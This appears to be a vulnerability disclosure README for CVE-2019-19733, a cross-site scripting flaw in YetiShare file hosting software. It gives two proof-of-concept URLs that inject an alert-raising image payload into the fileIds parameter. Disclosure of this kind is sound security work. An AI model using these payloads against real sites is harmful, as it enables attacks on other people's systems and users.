# CVE-2019-19733
YetiShare v3.5.2 - v4.5.3 Cross-site scripting in get_all_file_server_paths.ajax.php

# Example in v3.5.2
```
http://192.168.0.62/_get_all_file_server_paths.ajax.php?folderId=2&fileIds[]=%3Cimg%20src=x%20onerror=alert(1)%3E
```

# Example in v4.5.3
```
https://192.168.0.62/admin/ajax/get_all_file_server_paths.ajax.php?folderId=2&fileIds[]=%3Cimg%20src=x%20onerror=alert(1)%3E
```

</br></br>
<kbd>
  <img src="/yetishare-xss2.png?raw=true">
</kbd>
